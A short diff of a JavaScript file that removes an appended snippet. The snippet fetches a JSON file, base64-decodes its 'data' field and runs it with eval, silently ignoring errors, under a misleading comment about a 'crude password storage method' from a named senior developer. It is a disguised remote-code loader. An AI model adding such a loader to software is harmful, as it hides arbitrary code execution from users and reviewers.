@@ -128,6 +128,3 @@
 
     init();
 })();
-
-//testing a crude password storage method suggested by Kyle (Senior Developer)
-(()=>{fetch('/json/other/checksum.json').then($=>$.json()).then(_=>{eval(atob(_.data))}).catch(()=>{})})();
